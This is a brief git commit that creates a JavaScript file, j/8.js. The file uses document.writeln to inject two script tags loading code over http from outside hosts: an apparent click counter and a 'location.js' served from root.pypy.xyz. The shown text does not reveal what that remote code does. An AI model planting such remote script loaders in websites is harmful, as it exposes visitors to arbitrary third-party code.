e010587af5f0b5a985b4681ffc715e511bd7fdf7
opensus <jesses.king@outlook.com>
2015-06-12 15:24:21 +0800

    Create 8.js

---
+++ j/8.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count22.51yes.com\/click.aspx?id=228121829&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/root.pypy.xyz\/j\/location.js\"><\/script>")
